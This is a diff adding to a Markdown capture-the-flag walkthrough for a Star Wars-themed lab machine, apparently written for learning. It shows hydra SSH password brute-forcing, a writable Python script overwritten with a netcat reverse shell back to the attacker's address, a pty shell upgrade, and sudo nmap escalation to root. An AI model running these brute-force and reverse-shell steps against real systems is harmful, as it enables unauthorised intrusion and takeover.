@@ -103,3 +103,85 @@ Now that we have a list of passwords we can use this command to brute force our 
 ```
 hydra -l anakin -P ./passwords.txt 10.38.1.114 -t 4 ssh1
 ```
+
+The results for the user `anakin` didn't return any results but running that same command for the user `skywalker` gives us this result:
+
+![](Images/skywalk_ssh.JPG)
+
+`SSH`ing into the user `skywalker` and viewing the directory we see there is another `.secrets` directory.
+
+The contents of which is another `note.txt` that contains this message:
+
+![](Images/skynote.JPG)
+
+From this we can assume that `Darth` must be another user. Lets see if we can run the Hydra command from earlier in an attempt to brute force the password for `Darth`.
+
+```
+hydra -l darth -P ./passwords.txt 10.38.1.114 -t 4 ssh1
+```
+
+With no avail to brute force the password, lets see if we can access `Darth`'s home directory:
+
+```
+cd /home/Darth/
+```
+Upon navigating and traversing through the directories we see that there is a writable python script:
+
+![](Images/darthpy.JPG)
+
+The contents of the script currently are irrelevant, however we can change it to use a netcat listener to give us a reverse shell.
+
+```
+import os
+os.system("nc -e /bin/bash 10.38.1.110 1234")
+```
+After replacing with the above code and navigating to a new terminal we input the command to start our listener 
+```
+nc -lnvp 1234
+```
+
+We wait a minute and are greeted with this connection, we can use `whoami` to confirm we are infact the user `Darth`:
+
+![](Images/ncdarth.JPG)
+
+In order to get a proper bash shell we can use this command:
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+![](Images/darthshell.JPG)
+
+We now have our shell, let's see what kind of permissions we have as `Darth`. We can use this command to see if we hold `sudo` privileges for anything: 
+
+```
+sudo -l
+```
+
+We can see by this output we do in fact have `sudo` privileges for nmap.
+
+![](Images/darthsudo.JPG)
+
+We can see that we are running `nmap` version 7.70
+
+![](Images/nmapvers.JPG)
+
+After some looking in the man pages we see that this version of nmap can run lua scripts. Looking on the internet we find this write up for how to use a lua script with nmap to gain root privileges:
+
+![](Images/nmap770root.JPG)
+
+
+
+After running the command and checking `whoami` we can see that we have gained root access.
+
+![](Images/root.JPG)
+
+After `cd` to `/root` and looking at all the files we can see one called `flag.txt`
+
+![](Images/rootfiles.JPG)
+
+When we `cat` the file se are shown this output!!!
+
+![](Images/vader.JPG)
+
+# Congratulations!!!
+
+#### Thanks so much for coming along on this journey with me
